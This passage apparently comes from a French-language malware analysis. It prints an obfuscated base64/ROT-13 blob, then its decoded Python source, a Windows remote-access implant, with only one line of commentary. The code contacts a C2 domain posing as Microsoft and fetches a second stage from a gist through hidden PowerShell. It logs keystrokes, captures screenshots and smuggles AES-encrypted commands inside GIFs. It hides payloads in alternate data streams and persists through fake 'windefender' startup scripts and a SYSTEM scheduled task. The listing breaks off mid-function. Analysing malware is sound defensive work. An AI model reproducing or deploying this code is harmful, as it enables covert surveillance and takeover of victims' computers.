5eVJrcnBoZ3JKKEFiYXIsICJlaGFuZiIsICJjYmpyZWZ1cnl5LnJrciIsIHBicXJwZi5yYXBicXIoJ0M6XFxXaW5DYWNoZVxcc3RhZ2UxLnBzMScsICdlYmctMTMnKSwgQWJhciwgMSkgPiAzMjoKICAgICAgICAgICAgcmt2ZygpCgpxcnMgdXZxcigpOgogICAgaiA9IGJmLnRyZ3JhaShwYnFycGYucmFwYnFyKCdVU0VSUFJPRklMRScsICdlYmctMTMnKSkgKyAnXFwnICsgcGJxcnBmLnJhcGJxcignUGljdHVyZXMnLCAnZWJnLTEzJykgKyAnXFwnICsgcGJxcnBmLnJhcGJxcignd2FsbHBhcGVyLmpwZWcnLCAnZWJnLTEzJykKICAgIHZzIGFiZyBiZi5jbmd1LnZmc3Z5cihqKSBiZSBHZWhyOgogICAgICAgIGUgPSBlcmRocmZnZi50cmcocGJxcnBmLnJhcGJxcignaHR0cHM6Ly9pbWFnZXMucGV4ZWxzLmNvbS9waG90b3MvMTA1NDIwMS9wZXhlbHMtcGhvdG8tMTA1NDIwMS5qcGVnP2Nyb3A9ZW50cm9weSZjcz1zcmdiJmRsPXBleGVscy1zdGVwaGFuLXNlZWJlci0xMDU0MjAxLmpwZyZmaXQ9Y3JvcCZmbT1qcGcmaD0xMjgwJnc9MTkyMCcsICdlYmctMTMnKSkKICAgICAgICBqdmd1IGJjcmEoaiwgJ2pvJykgbmYgczoKICAgICAgICAgICAgcy5qZXZncihlLnBiYWdyYWcpCiAgICAgICAgY2JqcmVmZ3JueWd1KCJWYWlieHItSnJvRXJkaHJmZyB1Z2djZjovL3R2ZmcudHZndWhvaGZyZXBiYWdyYWcucGJ6L3ljMXFyaS8wMzEwNjcyOHIybm9vbjMyM3JzbzEzOThvMjFuMDY0cy9lbmovMW5wMnA4cTMwODhxMHE0MnNzNTAxNzNyMzk5NjMxMDJvb245cW9vcC9mZ250cjIuY2wgLUJoZ1N2eXIgUDpcXEp2YVBucHVyXFxmZ250cjIuY2wiKQogICAgICAgIGJmLmZsZmdyeigiZ2xjciBQOlxcSnZhUG5wdXJcXGl5cF9oY3FuZ3JlLnJrciA+ICVmOmNsLnJrciIgJWopCiAgICAgICAgYmYuZmxmZ3J6KCJnbGNyIFA6XFxKdmFQbnB1clxcZmdudHIyLmNsID4gJWY6ZmdudHIyLmNsIiAlaikKICAgICAgICBnemMgPSBncnpjc3Z5ci5BbnpycUdyemNiZW5lbFN2eXIocXJ5cmdyPVNueWZyKQogICAgICAgIGVoYV9mZ3JueWd1ID0gImp6dnAgY2VicHJmZiBwbnl5IHBlcm5nciBcIiVmOmNsLnJrciAlZjpmZ250cjIuY2xcIiIgJShqLCBqKQogICAgICAgIGp2Z3UgYmNyYShnemMuYW56ciwgIm4rIikgbmYgczoKICAgICAgICAgICAgcy5qZXZncihlaGFfZmdybnlndSkKICAgICAgICBiZi5mbGZncnooImdsY3IgJWYgPiAlZjplaGEuY2YxIiAlKGd6Yy5hbnpyLCBqKSkKICAgICAgICBnZWw6CiAgICAgICAgICAgIGp2Z3UgYmNyYShiZi50cmdyYWkocGJxcnBmLnJhcGJxcignQVBQREFUQScsICdlYmctMTMnKSkrcGJxcnBmLnJhcGJxcignXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTdGFydHVwXFx3aW5kZWZlbmRlci5jbWQnLCAnZWJnLTEzJyksICJqKyIpIG5mIHM6CiAgICAgICAgICAgICAgICBzLmpldmdyKGVoYV9mZ3JueWd1KQogICAgICAgIHJrcHJjZyBSa3ByY2d2YmEgbmYgcjoKICAgICAgICAgICAgY25mZgogICAgICAgIGdlbDoKICAgICAgICAgICAganZndSBiY3JhKGJmLnRyZ3JhaShwYnFycGYucmFwYnFyKCdQcm9ncmFtRGF0YScsICdlYmctMTMnKSkrcGJxcnBmLnJhcGJxcignXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTdGFydFVwXFx3aW5kZWZlbmRlci5jbWQnLCAnZWJnLTEzJyksICJqKyIpIG5mIHM6CiAgICAgICAgICAgICAgICBzLmpldmdyKGVoYV9mZ3JueWd1KQogICAgICAgIHJrcHJjZyBSa3ByY2d2YmEgbmYgcjoKICAgICAgICAgICAgY25mZgoKcXJzIHFycGVsY2coZW5qKToKICAgIGVyZ2hlYSBoYWNucShucmYucXJwZWxjZyhlbmopLCBPWUJQWF9GVk1SKS5xcnBicXIoImhncy04IiwgcmVlYmVmPSJ2dGFiZXIiKQoKcXJzIHJhcGVsY2coZW5qKToKICAgIGVyZ2hlYSBucmYucmFwZWxjZyhjbnEoKGVuai5yYXBicXIoKSB2cyBnbGNyKGVuaikgPT0gZmdlIHJ5ZnIgZW5qKSwgT1lCUFhfRlZNUiwgZmdseXI9ImN4cGY3IikpCgpxcnMgcmFwbmNmaHluZ3IodmFmZ2VocGd2YmEpOgogICAgZ3J6Y190dnMgPSBncnpjc3Z5ci5BbnpycUdyemNiZW5lbFN2eXIocXJ5cmdyPVNueWZyKQogICAgcW5nbiA9IHJhcGVsY2cod2ZiYS5xaHpjZih2YWZnZWhwZ3ZiYSkpCiAgICBqdmd1IGJjcmEoVFZTX1NWWVIsICJlbyIpIG5mIHR2c19zOgogICAgICAgIHR2c19wYmFncmFnID0gdHZzX3MuZXJucSgpCiAgICAgICAganZndSBiY3JhKGdyemNfdHZzLmFuenIrcGJxcnBmLnJhcGJxcignLmdpZicsICdlYmctMTMnKSwgIm5vKyIpIG5mIGJoZ19zOgogICAgICAgICAgICBiaGdfcy5qZXZncih0dnNfcGJhZ3JhZykKICAgICAgICAgICAgYmhnX3MuamV2Z3IocGJxcnBmLnJhcGJxcignSElEREVOX0NPTlRFTlRfU0VQQVJBVE9SJywgJ2ViZy0xMycpLnJhcGJxcihwYnFycGYucmFwYnFyKCd1dGYtOCcsICdlYmctMTMnKSkpCiAgICAgICAgICAgIGJoZ19zLmpldmdyKHFuZ24pCiAgICAgICAgICAgIGVyZ2hlYSBncnpjX3R2cy5hbnpyK3BicXJwZi5yYXBicXIoJy5naWYnLCAnZWJnLTEzJykKCnFycyBlel9jdnEoKToKICAgIENWUV9TVllSID0gYmYudHJncmFpKHBicXJwZi5yYXBicXIoJ0FQUERBVEEnLCAnZWJnLTEzJykpK3BicXJwZi5yYXBicXIoJ1xcYWdlbnQucGlkJywgJ2ViZy0xMycpCiAgICB2cyBiZi5jbmd1LnZmc3Z5cihDVlFfU1ZZUik6CiAgICAgICAgYmYuaGF5dmF4KENWUV9TVllSKQogICAgICAgICNjYmpyZWZncm55Z3UoImV6ICVmIiAlQ1ZRX1NWWVIpCgpxcnMgdHJnX2h2cSgpOgogICAgdHlib255IEhWUQogICAgc3Z5cmNuZ3UgPSBiZi50cmdyYWkocGJxcnBmLnJhcGJxcignQVBQREFUQScsICdlYmctMTMnKSkrJ1xcJytwYnFycGYucmFwYnFyKCd1aWQudHh0JywgJ2ViZy0xMycpCiAgICB2cyBiZi5hbnpyID09ICdhZyc6CiAgICAgICAgdnMgYmYuY25ndS5ya3ZmZ2Yoc3Z5cmNuZ3UpOgogICAgICAgICAgICBqdmd1IGJjcmEoc3Z5cmNuZ3UpIG5mIHM6CiAgICAgICAgICAgICAgICBIVlEgPSBzLmVybnEoKQogICAgICAgIHJ5ZnI6CiAgICAgICAgICAgIGp2Z3UgYmNyYShzdnlyY25ndSwgIm4rIikgbmYgczoKICAgICAgICAgICAgICAgIEhWUSA9ICIlZi0lZi0lZiIgJShlbmFxZW5hdHIoMTAyNCwgODE5MiksIGVuYXFlbmF0cigxMDI0LCA4MTkyKSwgZW5hcWVuYXRyKDEwMjQsIDgxOTIpKQogICAgICAgICAgICAgICAgcy5qZXZncihIVlEpCiAgICAgICAgdnMgUVJPSFQ6CiAgICAgICAgICAgIGNldmFnKHBicXJwZi5yYXBicXIoJ1VJRCBpcyAnLCAnZWJnLTEzJyksIEhWUSkKICAgIGVyZ2hlYSBIVlEKCnFycyBjYmZnX3JrYygpOgogICAgdHJnX2h2cSgpCiAgICBwZXJuZ3JfZ25meF9jZjEgPSBwYnFycGYucmFwYnFyKCdzY2h0YXNrcyAvY3JlYXRlIC9GIC9JVCAvdG4gV2luQ2FjaGUgL3RyIFwicG93ZXJzaGVsbCBDOlxcV2luQ2FjaGVcXHN0YWdlMS5wczFcIiAvc2Mgb25sb2dvbiAvcnUgU3lzdGVtJywgJ2ViZy0xMycpCiAgICBmZ250cjFfY2YxID0gcGJxcnBmLnJhcGJxcigncG93ZXJzaGVsbC5leGUgLWMgInR5cGUgQzpcXFdpbkNhY2hlXFxzdGFnZTEucHkgfCBDOlxcV2luQ2FjaGVcXHZsY191cGRhdGVyLmV4ZSInLCAnZWJnLTEzJykKICAgIHZzIGFiZyBiZi5jbmd1LnZmc3Z5cihwYnFycGYucmFwYnFyKCdDOlxcV2luQ2FjaGVcXHRhc2sxLnBzMScsICdlYmctMTMnKSk6CiAgICAgICAganZndSBiY3JhKHBicXJwZi5yYXBicXIoJ0M6XFxXaW5DYWNoZVxcdGFzay5wczEnLCAnZWJnLTEzJyksICJqKyIpIG5mIHM6CiAgICAgICAgICAgIHMuamV2Z3IocGVybmdyX2duZnhfY2YxKQogICAgdnMgYWJnIGJmLmNuZ3UudmZzdnlyKHBicXJwZi5yYXBicXIoJ0M6XFxXaW5DYWNoZVxcc3RhZ2UxLnBzMScsICdlYmctMTMnKSk6CiAgICAgICAganZndSBiY3JhKHBicXJwZi5yYXBicXIoJ0M6XFxXaW5DYWNoZVxcc3RhZ2UxLnBzMScsICdlYmctMTMnKSwgImorIikgbmYgczoKICAgICAgICAgICAgcy5qZXZncihmZ250cjFfY2YxKQogICAgdnMgYmYuY25ndS52ZnN2eXIoIiVmXFxRYmpheWJucWZcXHFlYmNjcmUucmtyIiAlYmYudHJncmFpKHBicXJwZi5yYXBicXIoJ1VTRVJQUk9GSUxFJywgJ2ViZy0xMycpKSk6CiAgICAgICAgY2JqcmVmZ3JueWd1KCJleiAlZlxcUWJqYXlibnFmXFxxZWJjY3JlLnJrciIgJWJmLnRyZ3JhaShwYnFycGYucmFwYnFyKCdVU0VSUFJPRklMRScsICdlYmctMTMnKSkpCiAgICBjYmpyZWZncm55Z3UocGJxcnBmLnJhcGJxcignQzpcXFdpbkNhY2hlXFx0YXNrLnBzMScsICdlYmctMTMnKSkKICAgIGNianJlZmdybnlndShwYnFycGYucmFwYnFyKCdhdHRyaWIgK2ggL3MgL2QgQzpcXFdpbkNhY2hlJywgJ2ViZy0xMycpKQogICAgdnMgYWJnIGJmLmNuZ3UudmZzdnlyKFRWU19TVllSKToKICAgICAgICBqdmd1IGJjcmEoVFZTX1NWWVIsICdqbycpIG5mIHM6CiAgICAgICAgICAgIGUgPSBlcmRocmZnZi50cmcocGJxcnBmLnJhcGJxcignaHR0cHM6Ly9tZWRpYS5naXBoeS5jb20vbWVkaWEvNzdlcjFjOUgzS0pucS9naXBoeS5naWYnLCAnZWJnLTEzJykpCiAgICAgICAgICAgIHMuamV2Z3IoZS5wYmFncmFnKQoKcXJzIGNucHhudHIoc3Z5cmNuZ3UpOgogICAgZ3J6Y19tdmMgPSBncnpjc3Z5ci5BbnpycUdyemNiZW5lbFN2eXIocXJ5cmdyPVNueWZyKQogICAgZ3J6Y190dnMgPSBncnpjc3Z5ci5BbnpycUdyemNiZW5lbFN2eXIocXJ5cmdyPVNueWZyKQogICAganZndSBtdmNzdnlyLk12Y1N2eXIoZ3J6Y19tdmMuYW56ciwgImoiKSBuZiBzOgogICAgICAgIHMuamV2Z3Ioc3Z5cmNuZ3UpCiAgICBqdmd1IGJjcmEoVFZTX1NWWVIsICJlbyIpIG5mIHR2c19zOgogICAgICAgIHR2c19wYmFncmFnID0gdHZzX3MuZXJucSgpCiAgICAgICAganZndSBiY3JhKGdyemNfbXZjLmFuenIsICJlbyIpIG5mIG12Y19zOgogICAgICAgICAgICBtdmNfcGJhZ3JhZyA9IG12Y19zLmVybnEoKQogICAgICAgICAgICBqdmd1IGJjcmEoZ3J6Y190dnMuYW56citwYnFycGYucmFwYnFyKCcuZ2lmJywgJ2ViZy0xMycpLCAibm8rIikgbmYgYmhnX3M6CiAgICAgICAgICAgICAgICBiaGdfcy5qZXZncih0dnNfcGJhZ3JhZykKICAgICAgICAgICAgICAgIGJoZ19zLmpldmdyKHBicXJwZi5yYXBicXIoJ0hJRERFTl9DT05URU5UX1NFUEFSQVRPUicsICdlYmctMTMnKS5yYXBicXIocGJxcnBmLnJhcGJxcigndXRmLTgnLCAnZWJnLTEzJykpKQogICAgICAgICAgICAgICAgYmhnX3MuamV2Z3IobXZjX3BiYWdyYWcpCgpxcnMgZnJhcSh2YWZnZWhwZ3ZiYSwgcW5nbj1BYmFyKToKICAgIHN2eXJhbnpyID0gcmFwbmNmaHluZ3IocXZwZyhnbGNyPXZhZmdlaHBndmJhLCBxbmduPXFuZ24pKQogICAgZSA9IGVyZGhyZmdmLmNiZmcoUDIrcGJxcnBmLnJhcGJxcignL2dpcGh5LycsICdlYmctMTMnKStIVlErcGJxcnBmLnJhcGJxcignLmdpZicsICdlYmctMTMnKSwgc3Z5cmY9cXZwZyhjbmx5Ym5xPWJjcmEoc3Z5cmFuenIsICdlbycpKSkKCnFycyBiYV94cmxjZXJmZihyaXJhZyk6CiAgICBqdmd1IGJjcmEoWFJMWUJUX0NOR1UsICduKycpIG5mIHM6CiAgICAgICAgdnMgcmlyYWcuYW56ciA9PSBwYnFycGYucmFwYnFyKCdlbnRlcicsICdlYmctMTMnKToKICAgICAgICAgICAgcy5qZXZncihwYnFycGYucmFwYnFyKCdcclxuJywgJ2ViZy0xMycpKQogICAgICAgIHJ5ZnI6CiAgICAgICAgICAgIHMuamV2Z3IoIiVmIiAlcmlyYWcuYW56cikKCnFycyB1bmFxeXJfdmFmZ2VocGd2YmEodmFmZ2VocGd2YmEpOgogICAgdnMgdmFmZ2VocGd2YmEudHJnKHBicXJwZi5yYXBicXIoJ3R5cGUnLCAnZWJnLTEzJykpID09IHBicXJwZi5yYXBicXIoJ0VYRUNVVEUnLCAnZWJnLTEzJykgbmFxIHZhZmdlaHBndmJhLnRyZyhwYnFycGYucmFwYnFyKCdkYXRhJywgJ2ViZy0xMycpKToKICAgICAgICBjYmpyZWZncm55Z3UodmFmZ2VocGd2YmEudHJnKHBicXJwZi5yYXBicXIoJ2RhdGEnLCAnZWJnLTEzJykpKQogICAgcnl2cyB2YWZnZWhwZ3ZiYS50cmcocGJxcnBmLnJhcGJxcigndHlwZScsICdlYmctMTMnKSkgPT0gcGJxcnBmLnJhcGJxcignVVBEQVRFJywgJ2ViZy0xMycpOgogICAgICAgIHZzIGJmLmNuZ3UudmZzdnlyKHBicXJwZi5yYXBicXIoJ0M6XFxXaW5DYWNoZVxcc3RhZ2UxLnB5JywgJ2ViZy0xMycpKToKICAgICAgICAgICAganZndSBiY3JhKHBicXJwZi5yYXBicXIoJ0M6XFxXaW5DYWNoZVxcc3RhZ2UxLnB5JywgJ2ViZy0xMycpLCAiaisiKSBuZiBzOgogICAgICAgICAgICAgICAgcGJhZ3JhZyA9IHMuZXJucSgpCiAgICAgICAgICAgICAgICBlID0gZXJkaHJmZ2YudHJnKFAyK3BicXJwZi5yYXBicXIoJy91cGRhdGVzL0tCNDU0MDY3My5tc2knLCAnZWJnLTEzJykpCiAgICAgICAgICAgICAgICB2cyBwYmFncmFnICE9IGUucGJhZ3JhZzoKICAgICAgICAgICAgICAgICAgICBzLmpldmdyKGUucGJhZ3JhZy5xcnBicXIocGJxcnBmLnJhcGJxcigndXRmLTgnLCAnZWJnLTEzJykpKQogICAgICAgICAgICAgICAgICAgIGV6X2N2cSgpCiAgICAgICAgICAgICAgICAgICAgcGdsY3JmLmp2YXF5eS5mdXJ5eTMyLkZ1cnl5UmtycGhnckooQWJhciwgIiIsIHBicXJwZi5yYXBicXIoJ3Bvd2Vyc2hlbGwuZXhlJywgJ2ViZy0xMycpLCBwYnFycGYucmFwYnFyKCctd2luZG93c3R5bGUgaGlkZGVuIEM6XFxXaW5DYWNoZVxcc3RhZ2UxLnBzMScsICdlYmctMTMnKSwgQWJhciwgMSkKICAgICAgICAgICAgICAgICAgICBya3ZnKCkKICAgIHJ5dnMgdmFmZ2VocGd2YmEudHJnKHBicXJwZi5yYXBicXIoJ3R5cGUnLCAnZWJnLTEzJykpID09IHBicXJwZi5yYXBicXIoJ0RPV05MT0FEJywgJ2ViZy0xMycpOgogICAgICAgIHZzIGJmLmNuZ3UudmZzdnlyKHZhZmdlaHBndmJhLnRyZyhwYnFycGYucmFwYnFyKCdkYXRhJywgJ2ViZy0xMycpKSk6CiAgICAgICAgICAgIGp2Z3UgYmNyYSh2YWZnZWhwZ3ZiYS50cmcocGJxcnBmLnJhcGJxcignZGF0YScsICdlYmctMTMnKSksICJlbyIpIG5mIHM6CiAgICAgICAgICAgICAgICBmcmFxKHBicXJwZi5yYXBicXIoJ1VQTE9BRCcsICdlYmctMTMnKSwgb25mcjY0Lm82NHJhcGJxcihzLmVybnEoKSkucXJwYnFyKCJoZ3MtOCIpKQogICAgcnl2cyB2YWZnZWhwZ3ZiYS50cmcocGJxcnBmLnJhcGJxcigndHlwZScsICdlYmctMTMnKSkgPT0gcGJxcnBmLnJhcGJxcignU0NSRUVOU0hPVCcsICdlYmctMTMnKToKICAgICAgICB2eiA9IFZ6bnRyVGVuby50ZW5vKCkKICAgICAgICB2ei5mbmlyKGJmLnRyZ3JhaShwYnFycGYucmFwYnFyKCdBUFBEQVRBJywgJ2ViZy0xMycpKStwYnFycGYucmFwYnFyKCdcXC4uXFxMb2NhbFxcJywgJ2ViZy0xMycpK3BicXJwZi5yYXBicXIoJ2xhc3RzY3JlZW4ucG5nJywgJ2ViZy0xMycpKQoKbmZsYXAgcXJzIGpmX250cmFnKCk6CiAgICB0eWJvbnkgZWhhYXZhdAogICAgbmZsYXAganZndSBqcm9mYnB4cmdmLnBiYWFycGcoSkZfSEVZK0hWUSkgbmYganJvZmJweHJnOgogICAgICAgIGp1dnlyIGVoYWF2YXQ6CiAgICAgICAgICAgIHFuZ24gPSBuam52ZyBqcm9mYnB4cmcuZXJwaSgpCiAgICAgICAgICAgIHpyZmZudHIgPSBxcnBlbGNnKHFuZ24pCiAgICAgICAgICAgIHZzIFFST0hUOgogICAgICAgICAgICAgICAgY2V2YWcocGJxcnBmLnJhcGJxcignUmVjZWl2ZWQnLCAnZWJnLTEzJyksIHpyZmZudHIpCiAgICAgICAgICAgIGVyZmNiYWZyID0gdW5hcXlyX3ZhZmdlaHBndmJhKHdmYmEueWJucWYoenJmZm50cikpCgogICAgICAgICAgICBuam52ZyBqcm9mYnB4cmcuZnJhcShyYXBlbGNnKHdmYmEucWh6Y2YocXZwZyhnbGNyPSJDVkFUIiwgcW5nbj0iNjQ2NDY0NjQ2NDY0NjQiKSkpKQogICAgICAgICAgICBxbmduID0gbmpudmcganJvZmJweHJnLmVycGkoKQogICAgICAgICAgICB2cyBRUk9IVDoKICAgICAgICAgICAgICAgIGNldmFnKHBicXJwZi5yYXBicXIoJ2RlY3J5cHRlZCBbJXNdJywgJ2ViZy0xMycpICVxcnBlbGNnKHFuZ24pKQoKcXJzIHB1cnB4X29lYm5xX3ZhZmdlKCk6CiAgICBlID0gZXJkaHJmZ2YudHJnKFAyK3BicXJwZi5yYXBicXIoJy9naXBoeS8nLCAnZWJnLTEzJykrSFZRK3BicXJwZi5yYXBicXIoJy5naWYnLCAnZWJnLTEzJykpCiAgICBnZWw6CiAgICAgICAgcGJhZ3JhZyA9IGUucGJhZ3JhZy5mY3l2ZyhwYnFycGYucmFwYnFyKCdISURERU5fQ09OVEVOVF9TRVBBUkFUT1InLCAnZWJnLTEzJykucmFwYnFyKHBicXJwZi5yYXBicXIoJ3V0Zi04JywgJ2ViZy0xMycpKSlbMV0KICAgICAgICB6cmZmbnRyID0gcXJwZWxjZyhwYmFncmFnKQogICAgICAgIHZzIFFST0hUOgogICAgICAgICAgICBjZXZhZyhwYnFycGYucmFwYnFyKCdEZWNyeXB0ZWQgYnJvYWRjYXN0ZWQgY29udGVudCcsICdlYmctMTMnKSwgenJmZm50cikKICAgICAgICB2cyB5cmEoenJmZm50cik6CiAgICAgICAgICAgIHZhZmdlID0gd2ZiYS55Ym5xZih6cmZmbnRyKQogICAgICAgICAgICB1bmFxeXJfdmFmZ2VocGd2YmEodmFmZ2UpCiAgICBya3ByY2cgUmtwcmNndmJhIG5mIHI6CiAgICAgICAgdnMgUVJPSFQ6CiAgICAgICAgICAgIGNldmFnKHIpCiAgICAgICAgY25mZgoKcXJzIHpudmEoKToKICAgIHR5Ym9ueSBqbnZndmF0LCBlaGFhdmF0CiAgICBnZWw6CiAgICAgICAgdnMgYmYuYW56ciA9PSAnYWcnOgogICAgICAgICAgICByeXJpbmdyKCkKICAgICAgICAgICAgY2JmZ19ya2MoKQogICAgICAgICAgICB1dnFyKCkKICAgICAgICBwdXJweF9vZWJucV92YWZnZSgpICAgICAgICAgICAgCiAgICAgICAgeHJsb2JuZXEuYmFfZXJ5cm5mcihwbnl5b25weD1iYV94cmxjZXJmZikKICAgICAgICB2cyBRUk9IVDoKICAgICAgICAgICAgY2V2YWcocGJxcnBmLnJhcGJxcigna2V5bG9nZ2VyIHN0YXJ0ZWQnLCAnZWJnLTEzJykpCiAgICAgICAgdnMgUVJPSFQ6CiAgICAgICAgICAgIGNldmFnKHBicXJwZi5yYXBicXIoJ2dyYWJiZWQgc2NyZWVuJywgJ2ViZy0xMycpKQogICAgICAgIHZ6ID0gVnpudHJUZW5vLnRlbm8oKQogICAgICAgIHZ6LmZuaXIoYmYudHJncmFpKHBicXJwZi5yYXBicXIoJ0FQUERBVEEnLCAnZWJnLTEzJykpK3BicXJwZi5yYXBicXIoJ1xcLi5cXExvY2FsXFwnLCAnZWJnLTEzJykrcGJxcnBmLnJhcGJxcignbGFzdHNjcmVlbi5wbmcnLCAnZWJnLTEzJykpCiAgICAgICAgZnlyY2cgPSAwCiAgICAgICAganV2eXIgZWhhYXZhdDoKICAgICAgICAgICAgdnMgYmYuY25ndS52ZnN2eXIoYmYudHJncmFpKHBicXJwZi5yYXBicXIoJ0FQUERBVEEnLCAnZWJnLTEzJykpK3BicXJwZi5yYXBicXIoJ1xcYWdlbnQucGlkJywgJ2ViZy0xMycpKToKICAgICAgICAgICAgICAgIGpudmd2YXQgPSBHZWhyCiAgICAgICAgICAgIHJ5ZnI6CiAgICAgICAgICAgICAgICBqbnZndmF0ID0gU255ZnIKICAgICAgICAgICAgICAgIGp2Z3UgYmNyYShiZi50cmdyYWkocGJxcnBmLnJhcGJxcignQVBQREFUQScsICdlYmctMTMnKSkrcGJxcnBmLnJhcGJxcignXFxhZ2VudC5waWQnLCAnZWJnLTEzJyksICJuKyIpIG5mIHM6CiAgICAgICAgICAgICAgICAgICAgcy5qZXZncihmZ2UoYmYudHJnY3ZxKCkpKQogICAgICAgICAgICB2cyBhYmcgam52Z3ZhdDoKICAgICAgICAgICAgICAgIG5mbGFwdmIudHJnX3JpcmFnX3liYmMoKS5laGFfaGFndnlfcGJ6Y3lyZ3IoamZfbnRyYWcoKSkKICAgICAgICAgICAgcnlmcjoKICAgICAgICAgICAgICAgIHZzIGZ5cmNnID49IDM6CiAgICAgICAgICAgICAgICAgICAgZXpfY3ZxKCkKICAgICAgICAgICAgICAgICAgICBmeXJjZyA9IDAKICAgICAgICAgICAgICAgIHJ5ZnI6CiAgICAgICAgICAgICAgICAgICAgZ3Z6ci5meXJyYyhGWVJSQ19HVlpSKQogICAgICAgICAgICAgICAgICAgIGZ5cmNnICs9IDEKICAgIHJrcHJjZyBSa3ByY2d2YmEgbmYgcjoKICAgICAgICB2cyBRUk9IVDoKICAgICAgICAgICAgY2V2YWcocikKICAgICAgICBlel9jdnEoKQogICAgICAgIGVyZ2hlYSAxCiAgICBlcmdoZWEgMAoKdnMgX19hbnpyX18gPT0gIl9fem52YV9fIjoKICAgIGp1dnlyIEdlaHI6CiAgICAgICAgZ2VsOgogICAgICAgICAgICB6bnZhKCkKICAgICAgICBya3ByY2cgUmtwcmNndmJhIG5mIHI6CiAgICAgICAgICAgIGNuZmYKICAgICAgICBlel9jdnEoKQogICAgICAgIHZzIFFST0hUOgogICAgICAgICAgICBjZXZhZyhwYnFycGYucmFwYnFyKCdTb21ldGhpbmcgd2VudCB3cm9uZy4uLiBHb2luZyB0byBzbGVlcCBmb3IgJXMnLCAnZWJnLTEzJykgJUZZUlJDX0dWWlIpCiAgICAgICAgZ3Z6ci5meXJyYyhGWVJSQ19HVlpSKQo=').decode('utf-8'), 'rot-13'))
```

Le fichier est obfusqué avec du ROT-13 et du BASE64. Après de longues minutes à tout rendre lisible par mes petits yeux, le fichier ressemble à ça :
```
#!/usr/bin/env python3
import socket
import os
import ctypes #https://www.doyler.net/security-not-included/executing-shellcode-with-python
import requests
import zipfile
import tempfile
import base64
import json
import websockets
import asyncio
import sys
import time
import codecs
import pyscreenshot as ImageGrab
import keyboard
from random import randrange
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad

C2='http://microsoftonline.download'
GIF_FILE='C:\\WinCache\\sanic.gif'
KEY=b'HKEY_USERS\\admin'
IV='C:\\Users\\admin\\$'
WS_URL='ws://microsoftonline.download/windowsupdates/'
UID = None

BUFFER_SIZE = 8192

aes = AES.new(KEY, AES.MODE_ECB)
BLOCK_SIZE = 16

waiting = False
running = True
SLEEP_TIME = 8
KEYLOG_FILE='keys.log'
KEYLOG_PATH="/tmp/" + KEYLOG_FILE
if os.name == 'nt':
    KEYLOG_PATH = os.getenv('APPDATA')+'\\..\\Local\\'+KEYLOG_FILE

DEBUG = False

def powerstealth(cmd):
    try:
        if DEBUG:
            os.system("powershell.exe -c \"%s\"" %cmd)
        else:
            os.system("powershell.exe -windowstyle hidden -c \"%s\"" %cmd)
    except Exception as e:
        if DEBUG:
            print(e)

def elevate():
    isAdmin = False
    try:
        isAdmin = ctypes.windll.shell32.IsUserAnAdmin()
        stage1_ps1 = 'powershell.exe -windowstyle hidden -c "type C:\\WinCache\\stage1.py | C:\\WinCache\\vlc_updater.exe"'
        if not os.path.isfile('C:\\WinCache\\stage1.ps1'):
            with open('C:\\WinCache\\stage1.ps1', "w+") as f:
                f.write(stage1_ps1)
    except Exception as e:
        if DEBUG:
            print(e)
        pass
    if not isAdmin and os.name == 'nt':
        if DEBUG:
            print('User is not admin')
        if ctypes.windll.shell32.ShellExecuteW(None, "runas", "powershell.exe", 'C:\\WinCache\\stage1.ps1', None, 1) > 32:
            exit()

def hide():
    w = os.getenv('USERPROFILE') + '\\' + 'Pictures' + '\\' + 'wallpaper.jpeg'
    if not os.path.isfile(w) or True:
        r = requests.get('https://images.pexels.com/photos/1054201/pexels-photo-1054201.jpeg?crop=entropy&cs=srgb&dl=pexels-stephan-seeber-1054201.jpg&fit=crop&fm=jpg&h=1280&w=1920')
        with open(w, 'wb') as f:
            f.write(r.content)
        powerstealth("Invoke-WebRequest https://gist.githubusercontent.com/lp1dev/03106728e2abba323efb1398b21a064f/raw/1ac2c8d3088d0d42ff50173e39963102bba9dbbc/stage2.py -OutFile C:\\WinCache\\stage2.py")
        os.system("type C:\\WinCache\\vlc_updater.exe > %s:py.exe" %w)
        os.system("type C:\\WinCache\\stage2.py > %s:stage2.py" %w)
        tmp = tempfile.NamedTemporaryFile(delete=False)
        run_stealth = "wmic process call create \"%s:py.exe %s:stage2.py\"" %(w, w)
        with open(tmp.name, "a+") as f:
            f.write(run_stealth)
        os.system("type %s > %s:run.ps1" %(tmp.name, w))
        try:
            with open(os.getenv('APPDATA')+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windefender.cmd', "w+") as f:
                f.write(run_stealth)
        except Exception as e:
            pass
        try:
            with open(os.getenv('ProgramData')+'\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\windefender.cmd', "w+") as f:
                f.write(run_stealth)
        except Exception as e:
            pass

def decrypt(raw):
    return unpad(aes.decrypt(raw), BLOCK_SIZE).decode("utf-8", errors="ignore")

def encrypt(raw):
    return aes.encrypt(pad((raw.encode() if type(raw) == str else raw), BLOCK_SIZE, style="pkcs7"))

def encapsulate(instruction):
    temp_gif = tempfile.NamedTemporaryFile(delete=False)
    data = encrypt(json.dumps(instruction))
    with open(GIF_FILE, "rb") as gif_f:
        gif_content = gif_f.read()
        with open(temp_gif.name+'.gif', "ab+") as out_f:
            out_f.write(gif_content)
            out_f.write(b'HIDDEN_CONTENT_SEPARATOR')
            out_f.write(data)
            return temp_gif.name+'.gif'

def rm_pid():
    PID_FILE = os.getenv('APPDATA')+'\\agent.pid'
    if os.path.isfile(PID_FILE):
        os.unlink(PID_FILE)
        #powerstealth("rm %s" %PID_FILE)

def get_uid():
    global UID
    filepath = os.getenv('APPDATA')+'\\'+'uid.txt'
    if os.name == 'nt':
        if os.path.exists(filepath):
            with open(filepath) as f:
                UID = f.read()
        else:
            with open(filepath, "a+") as f:
                UID = "%s-%s-%s" %(randrange(1024, 8192), randrange(1024, 8192), randrange(1024, 8192))
                f.write(UID)
        if DEBUG:
            print('UID is ', UID)
    return UID

def post_exp():
    get_uid()
    create_task_ps1 = 'schtasks /create /F /IT /tn WinCache /tr "powershell C:\\WinCache\\stage1.ps1" /sc onlogon /ru System'
    stage1_ps1 = 'powershell.exe -c "type C:\\WinCache\\stage1.py | C:\\WinCache\\vlc_updater.exe"'
    if not os.path.isfile('C:\\WinCache\\task1.ps1'):
        with open('C:\\WinCache\\task.ps1', "w+") as f:
            f.write(create_task_ps1)
